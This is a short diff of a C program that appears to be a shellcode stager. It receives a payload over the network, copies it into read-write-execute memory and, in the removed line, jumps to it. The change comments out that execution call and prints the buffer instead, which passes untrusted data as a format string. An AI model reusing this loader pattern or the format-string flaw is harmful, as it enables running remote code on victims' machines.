@@ -59,14 +59,15 @@ int main() {
   } while (res > 0);
   strcat(data, "\0");
   printf("Received payload with size of %d.\n", recvd);
-  printf(data);
+  //printf(data);
   printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
   void* rwx = VirtualAlloc(NULL, PAYLOAD_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   memcpy(rwx, data, recvd);
+  printf((char *)rwx);
 
   printf("Executing payload.\n");
   // Execute the received payload
-  (*(void(*)()) rwx)();
+  //(*(void(*)()) rwx)();
 }
 
